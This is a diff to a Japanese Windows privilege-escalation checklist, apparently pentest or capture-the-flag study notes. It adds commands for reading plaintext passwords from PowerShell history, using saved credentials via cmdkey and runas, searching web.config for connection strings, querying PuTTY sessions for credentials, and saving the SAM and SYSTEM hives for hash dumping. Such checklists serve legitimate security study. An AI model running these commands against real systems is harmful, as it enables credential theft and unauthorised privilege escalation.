@@ -41,15 +41,45 @@ version
 ```
 C:\Unattend.xml
 C:\Windows\Panther\Unattend.xml
-C:\Windows\Panther\Unatend\Unattend.xml
-C:\Windows\System32\sysprep.inf
-C:\Windows\System32\sysprep\sysprep.xml
+C:\Windows\Panther\Unattend\Unattend.xml
+C:\Windows\system32\sysprep.inf
+C:\Windows\system32\sysprep\sysprep.xml
 ```
 16. whoami /privでトークン権限を確認後、EnableAllTokenPrivs.ps1のツールを使って全てをenabledにする。その後、そのトークンを使って権限昇格ができないか。
 17. PuttyがWindwosにインストールされている場合、reg queryコマンドで別ユーザの認証情報を取得できないか
 ```
 reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
+reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 ```
+18. Powershellのコマンド履歴として以下のパスから平文のパスワードを取得できないか。
+```
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+```
+19. Windowsに保存されている資格情報の取得や利用を試みたか。
+```
+cmdkey /list
+runas /savecred /user:admin cmd.exe
+```
+20. IISがインストールされている場合、web.configに認証情報はなかったか。  
+web.configの場所は以下のいずれか。
+```
+C:\inetpub\wwwroot\web.config
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+```  
+以下のコマンドでweb.configから認証情報を検索できる。
+```
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+```
+
+21. SeBackupとSeResoterの権限が割り当てられていないか、権限が有効な場合、SAMハッシュとSYSTEMハッシュをダンプできる。
+```
+whoami /priv
+reg save hklm\system C:\Users\THMBackup\system.hive
+reg save hklm\sam C:\Users\THMBackup\sam.hive
+```
+
+
+===========
 
 # Linux
 
